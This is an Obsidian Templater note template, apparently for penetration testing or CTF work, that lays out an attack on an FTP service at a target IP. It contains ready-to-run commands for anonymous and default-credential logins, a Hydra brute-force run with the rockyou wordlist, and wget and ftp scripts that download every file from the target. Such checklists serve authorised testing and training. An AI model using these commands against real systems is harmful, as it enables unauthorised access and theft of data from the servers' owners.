<%-*
if ( tp.frontmatter.current_port  == undefined) {
	tp.frontmatter.current_port = await tp.system.prompt('Enter port number: ')
}
-%>
# FTP - <% tp.frontmatter.current_port %>
<%* 
let extra_port = ""
if (parseInt(tp.frontmatter.current_port) == 21) {
extra_port = `-P ${tp.frontmatter.current_port}`
}
-%>
## Anonymous login
```bash
ftp ftp://anonymous:anonymous@<% tp.frontmatter.target_ip %> <% extra_port %>
```

## user/password guesses
```bash
ftp ftp://admin:password@<% tp.frontmatter.target_ip %> <% extra_port %>
```

```bash
ftp ftp://admin:password@<% tp.frontmatter.target_ip %> <% extra_port %>
```

**If you have a username, try there username as the password**

## Brute force user
**If you have a username**
```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://<% tp.frontmatter.target_ip %>
```

## Download EVERYTHING

```bash
wget -m --user=username --password=password ftp://<% tp.frontmatter.target_ip %>
```

**Script of you don't want to use wget**
```bash
#! /bin/bash

ftp -n << 'EOF'
open <% tp.frontmatter.target_ip %>
quote USER your_username_here
quote PASS your_password_here
prompt no
mget * .
bye
EOF
```
